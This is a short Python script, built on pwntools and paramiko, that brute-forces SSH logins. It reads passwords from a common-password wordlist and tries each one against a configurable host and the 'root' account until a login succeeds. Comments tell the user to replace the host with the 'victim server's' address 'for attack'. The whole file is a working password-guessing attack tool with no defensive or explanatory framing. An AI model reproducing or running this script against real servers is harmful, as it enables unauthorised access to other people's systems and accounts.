from socket import timeout
from pwn import *
import paramiko
import termcolor

# You need to change this host variable for victim server's ip or domen for attack
host = '127.0.0.1'
# You need to change this username variable for victim server's username for attack
username = 'root'
attempts = 0

# You need to create text file for list passwords
with open('ssh-common-passwords.txt','r') as password_list:
    for password in password_list:
        password = password.strip('\n')
        try:
            print(termcolor.colored(f'[{attempts}] Attempting password: {password}','blue'))
            response = ssh(host=host, user=username,password=password,timeout=1)
            if response.connected():
                print(termcolor.colored(f'[>] Correct Password found: {password}','green'))
                response.close()
                break
            response.close()
        except paramiko.ssh_exception.AuthenticationException:
            print(termcolor.colored('[X] Wrong Password','red'))
        attempts += 1